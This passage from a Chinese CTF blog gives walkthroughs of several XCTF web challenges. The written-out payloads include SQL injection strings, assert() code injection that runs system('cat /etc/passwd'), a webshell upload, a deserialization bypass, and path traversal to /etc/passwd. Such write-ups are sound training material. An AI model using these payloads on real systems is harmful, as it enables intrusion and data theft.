class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// 字符串拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">    <span class="comment">// 先base64编码、再逆序，再进行ROT13 编码（所有字母按照字母表向前移动13位）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>有几个函数拿出来记录一下：</p><ul><li>strrev(str)：对字符串执行逆序操作，如str=abcd，执行后为dcba</li><li>substr(str, a, n)：在字符串str中，从下标为a开始截取，共截取n个字符（不指定n则截取到末尾）。题目中n为1，a又是不断递增，所以和啊a[i]这种没有区别</li><li>ord(s)：返回字符s的ascii码</li><li>chr(n)：返回数字n对应的asscii字符</li><li>str_rot13(str)：字符串str中所有字母按照字母表向前移动13位（还原就是再执行一次该函数）</li></ul><p>知道了加密流程，解密就从后往前依次反向操作就OK了，直接用php写吧，代码如下：</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_o</span> = base64_decode(strrev(str_rot13(<span class="variable">$str</span>)));</span><br><span class="line">    <span class="variable">$_</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span> = <span class="number">0</span>; <span class="variable">$_0</span> &lt; strlen(<span class="variable">$_o</span>); <span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span> = substr(<span class="variable">$_o</span>, <span class="variable">$_0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span> = ord(<span class="variable">$_c</span>) - <span class="number">1</span>;  <span class="comment">// 解密减1</span></span><br><span class="line">        <span class="variable">$_c</span> = chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_</span> . <span class="variable">$_c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strrev(<span class="variable">$_</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>传入密文，执行即可得到flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/12/1602477623.png" alt="1602774229504.png"></p><h2 id="⭐-PHP2（phps源码泄漏-URLencode绕过）"><a href="#⭐-PHP2（phps源码泄漏-URLencode绕过）" class="headerlink" title="⭐ PHP2（phps源码泄漏+URLencode绕过）"></a>⭐ PHP2（phps源码泄漏+URLencode绕过）</h2><p>题目首页：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331731.png" alt="1602926244643.png"></p><p>尝试直接在url后边加id=1……来猜测，但是无果。经师傅们的博文提示，得知寻在index.php文件，但是访问该文件没有反应。</p><p>OK，尝试访问index.phps（.phps后缀为php文件的源码文件，用于在网页查看php源码，因为php会被解析执行），得到页面源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>进行简单的审计</strong></p><p>GET方式传入id参数，对id有两个if判断语句：</p><ul><li>第一个：强等于判断id是否为admin，若是则终止程序</li><li>第二个：弱等于判断id是否为admin，若是则输出flag</li></ul><p>其中，第一个和第二个if判断之间进行了一次主动url解码操作。</p><p>起初以为是php弱类型相关题目，所以传入了id=0，但是不正确，于是采用另一种。</p><p>根据源码，需要在传入id时绕过第一次的等于admin判断，即第一次admin判断为false，然后经过urldecode后，再次判断admin为true。但是由于浏览器有一次url自解码操作，所以需要进行两次url编码。</p><p>使用Burp对admin做url二次编码：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331747.png" alt="1602927131742.png"></p><p>传入id，得到flag：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331756.png" alt="1602927173038.png"></p><h2 id="⭐-NewsCenter（常规SQL注入）"><a href="#⭐-NewsCenter（常规SQL注入）" class="headerlink" title="⭐ NewsCenter（常规SQL注入）"></a>⭐ NewsCenter（常规SQL注入）</h2><p>一道SQL注入题目，很基础的POST字符型注入，首先fuzz以下得到可解析符号，最终得到使用以下payload可成功解析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure><p>没有任何过滤，因此按照常规手工注入步骤依次执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; order by 3 #</span><br><span class="line">-1&#39; union select 1,2,3 #</span><br><span class="line">-1&#39; union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&quot;news&quot; #</span><br><span class="line">-1&#39; union select 1,2,column_name from information_schema.columns where table_name&#x3D;&quot;secret_table&quot; #</span><br><span class="line">-1&#39; union select 1,2,fl4g from secret_table #</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331798.png" alt="1602939552256.png"></p><p>也可以sqlmap进行工具注入。</p><h2 id="⭐-mfw（-git源码泄露-assert-命令执行）"><a href="#⭐-mfw（-git源码泄露-assert-命令执行）" class="headerlink" title="⭐ mfw（.git源码泄露+assert()命令执行）"></a>⭐ mfw（.git源码泄露+assert()命令执行）</h2><p>网站使用page参数进行文件包含，尝试直接包含passwd文件结果有过滤，About页面有提示用了Git、php和bootstrap</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331832.png" alt="1604045680816.png"></p><p>使用Git就应该想到**.git源码泄漏**，Dirb跑一下果然存在.git目录，使用工具GitHack恢复git历史文件，恢复的原理是：</p><p>解析 <code>.git/index</code> 文件，并找到工程中所有的文件名和文件 sha1，然后去 <code>.git/objects/</code> 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。具体可参考下面的文章：</p><ul><li>git源码泄露总结：<a href="https://blog.csdn.net/qq_36869808/article/details/88909961"><strong>https://blog.csdn.net/qq_36869808/article/details/88909961</strong></a></li></ul><p>使用GitHack恢复出以下文件，但是flag没有直接给出，考虑其他办法</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331970.png" alt="1604048674270（1）.png"></p><p>在index.php中发现了过滤代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第9行使用了**assert()**断言函数，这个函数是可以用来进行代码执行的，而且过滤也很简单，就是用<code>strpos (&#39;$file&#39;, &#39;..&#39;)</code>判断是否存在<code>..</code>，既然知道了过滤方法，也没有对page参数做安全校验，所以可以来命令执行</p><p>首先需要闭合strpos的前半部分，然后加入system()代码，再闭合后半部分，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;) === false and system(&#x27;</span>cat /etc/passwd<span class="string">&#x27;) and strpos(&#x27;</span>aaa</span><br></pre></td></tr></table></figure><p>url编码后传参，成功执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%<span class="number">27</span>%<span class="number">2</span>c+%<span class="number">27123</span>%<span class="number">27</span>)+%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">3</span>d+<span class="literal">false</span>+<span class="keyword">and</span>+system(%<span class="number">27</span>cat+%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd%<span class="number">27</span>)+<span class="keyword">and</span>+strpos(%<span class="number">27</span>aaa</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331986.png" alt="1604049280880 (1).png"></p><p>修改文件为./templates/flag.php文件，即可得到flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332006.png" alt="1604049453092 (1).png"></p><p>经过大佬的指点，理解了为什么git源码中看不到flag，而cat就可以，因为cat的文件和.git中存放的不是同一个文件。</p><h2 id="⭐-upload1（前端JS校验绕过）"><a href="#⭐-upload1（前端JS校验绕过）" class="headerlink" title="⭐ upload1（前端JS校验绕过）"></a>⭐ upload1（前端JS校验绕过）</h2><p>打开题目，一个文件上传的功能，尝试上传shell.php，提示只允许jpg或png，F12在网络中没发现js文件，查看源吗发现前端过滤的js文件：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332095.png" alt="1602930407128(1).png"></p><p>使用NoScript无效后，索性抓包并主动响应该请求，修改响应包的js源码，直接将校验函数return true：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332108.png" alt="1602930629651.png"></p><p>再次上传shell.php，即可成功上传</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332116.png" alt="1602930706543.png"></p><p>蚁剑连接，在web根目录发现flag.php，得到flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332124.png" alt="1602930765924.png"></p><p>当然还可以通过修改后缀的方式来绕过前端校验。</p><h2 id="⭐-ics-04（SQL注入-注册覆盖）"><a href="#⭐-ics-04（SQL注入-注册覆盖）" class="headerlink" title="⭐ ics-04（SQL注入+注册覆盖）"></a>⭐ ics-04（SQL注入+注册覆盖）</h2><p>题目描述，在系统地登录和注册处存在安全漏洞，立马想到可能是SQL注入。</p><p>系统有注册、登录和找回密码三处功能，注册了几个账户，登陆后体术普通用户登陆无效，看来需要管理员账户或权限</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332371.png" alt="1604221348795.png"></p><p>尝试在注册处抓包，通过user level修改权限进行越权，但是没有发现相关参数。</p><p>接着在找回密码处发现了SQL注入，直接丢SQLmap跑出了user表的内容，得到一个默认账户，猜测是管理员账户</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332386.png" alt="1604221498269(1).png"></p><p>密码MD5直接跑出来了😂应该是做了这个题后添加了这条记录吧</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332417.png" alt="1604221772450.png"></p><p>登录该账户，即可得到flag。</p><p>但是这道题应该不是仅仅利用一个SQL注入的，原意是密码无法解开吧，所以在SQL注入得到管理员用户名后，需要利用重复注册漏洞来覆盖管理员密码</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332426.png" alt="1604222001521.png"></p><p>用设定的新密码登录，即可得到flag</p><h2 id="⭐-unserialize3（php反序列化-wakeup-绕过）"><a href="#⭐-unserialize3（php反序列化-wakeup-绕过）" class="headerlink" title="⭐ unserialize3（php反序列化__wakeup()绕过）"></a>⭐ unserialize3（php反序列化__wakeup()绕过）</h2><p>题目是一段php代码，是反序列化题目，需要将序列化结果通过code传递。</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324557.png" alt="1602406299342.png"></p><p>源码保存到本地，添加序列化代码进行审计和输出测试，需要补全大括号</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> xctf;</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p>首先发现，代码中存在__wakeup()魔术方法，该魔术方法在反序列化操作执行前调用，用于初始化操作，如获取必要资源等。</p><p>但是本题中<code>__wakeup()</code>内容是结束程序，因此很明显本题是要利用__wakeup()魔术方法的失效漏洞，即<strong>在反序列化时，当对象属性个数大于真实个数，就会绕过该魔术方法直接执行反序列化操作。</strong></p><p>执行该代码，得到以下序列化结果：</p><pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>将属性数量改为大于当前数量的值，比如2，然后发包，即可得到flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324566.png" alt="1602405430595.png"></p><h2 id="⭐-warmup（文件包含）"><a href="#⭐-warmup（文件包含）" class="headerlink" title="⭐ warmup（文件包含）"></a>⭐ warmup（文件包含）</h2><p><a href="https://www.yyxzz.net/articles/169.html"><strong>https://www.yyxzz.net/articles/169.html</strong></a></p><p>题目出自2018 HCTF，打开链接（滑稽.jpg）🧐<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923174.png" alt="1602763719432.png"></p><p>将图片保存到本地没有发现线索，查看网页源码，发现了提示：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923200.png" alt="1602763786996.png"></p><p>存在source.php，于是地址后边跟source.php，成功输出源码<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923210.png" alt="1602763852951.png"></p><p><strong>保存至本地，进行代码审计</strong></p><p>但是审计时发现，诶，怎么有点熟悉，好像之前复现了一个phpmyadmin任意文件包含的漏洞，跟这个题目的源码逻辑一模一样，太棒了！</p><p>具体的审计过程可以参考之前的phpmyadmin漏洞复现，原理一模一样！</p><p>这里大致说一下漏洞：</p><ul><li>程序设定文件白名单，并利用？分割后的第一个数据来做白名单校验，还加入了urldecode，因此可以二次传递进行目录穿越，达到任意文件读取。</li></ul><p>OK回到题目，经过对source.php审计发现，还有一个hint.php，因为是白名单内所以正常包含该文件，得到以下关于flag的线索：存在于 ffffllllaaaagggg 文件内<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923287.png" alt="1602764402114.png"></p><p>在当前目录包含失败后，考虑可能存在于根目录，于是不断尝试利用passwd文件找到根目录</p><p>payload：</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></code></pre><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923309.png" alt="1602764669041.png"></p><p>根目录包含flag文件，得到flag</p><p>payload：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923324.png" alt="1602764846675.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
